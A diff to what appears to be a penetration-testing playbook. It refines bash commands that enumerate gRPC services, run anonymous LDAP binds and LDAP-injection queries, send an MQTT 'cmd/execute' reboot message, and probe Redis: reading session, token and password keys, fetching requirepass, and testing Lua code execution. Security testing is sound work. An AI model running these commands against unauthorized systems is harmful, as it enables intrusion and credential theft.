@@ -53,8 +53,13 @@ nmap -sV -p 4317,4318,50051,8080-8090,1883,1884,8883,389,636,25,587,465,21,6379,
 
 ```bash
 # Service discovery (requires server reflection enabled)
-grpcurl -plaintext TARGET:50051 list
-grpcurl -plaintext TARGET:4317 list
+grpcurl -plaintext TARGET:50051 list 2>&1
+grpcurl -plaintext TARGET:4317 list 2>&1
+# If output is "Failed to list services: server does not support the reflection API":
+# Reflection is disabled — find .proto files in source instead:
+find /opt/app/src -name "*.proto" 2>/dev/null | head -10
+# Then use grpcurl with the proto file:
+# grpcurl -plaintext -proto /path/to/service.proto TARGET:50051 list
 
 # Enumerate methods on each service
 grpcurl -plaintext TARGET:50051 list <ServiceName>
@@ -124,10 +129,11 @@ curl -s -i -N -H "Upgrade: websocket" -H "Connection: Upgrade" \
 
 ```bash
 # Anonymous bind — does the server allow unauthenticated reads?
-ldapsearch -x -H ldap://TARGET -b "dc=TARGET,dc=com" 2>/dev/null | head -40
+# -l 5 = time limit in seconds (prevents hang if LDAP is unreachable)
+ldapsearch -x -H ldap://TARGET -b "dc=TARGET,dc=com" -l 5 2>/dev/null | head -40
 
 # Null base DN — enumerate root DSE
-ldapsearch -x -H ldap://TARGET -b "" -s base "objectclass=*" 2>/dev/null | head -20
+ldapsearch -x -H ldap://TARGET -b "" -s base "objectclass=*" -l 5 2>/dev/null | head -20
 
 # User enumeration via LDAP injection
 ldapsearch -x -H ldap://TARGET -b "dc=TARGET,dc=com" \
@@ -187,8 +193,20 @@ mosquitto_pub -h TARGET -p 1883 -t "cmd/execute" -m '{"action":"reboot"}' 2>/dev
 # Redis — if port 6379 is open
 redis-cli -h TARGET ping 2>/dev/null
 redis-cli -h TARGET info server 2>/dev/null | head -20
+
+# Enumerate keys and read sensitive ones
 redis-cli -h TARGET keys "*" 2>/dev/null | head -30
-redis-cli -h TARGET config get "*" 2>/dev/null | grep -E "dir|dbfilename|requirepass" | head -10
+# For each interesting key (session, token, user, password, secret):
+redis-cli -h TARGET get "<interesting_key>" 2>/dev/null
+
+# Config — can we read the password or data directory?
+redis-cli -h TARGET config get "requirepass" 2>/dev/null
+redis-cli -h TARGET config get "dir" 2>/dev/null
+redis-cli -h TARGET config get "dbfilename" 2>/dev/null
+
+# Test for Lua code execution (if no auth)
+redis-cli -h TARGET eval "return redis.call('info','server')" 0 2>/dev/null | head -5
+# If this succeeds → Lua execution confirmed; this is a code execution vector if Redis runs as root
 ```
 
 ---
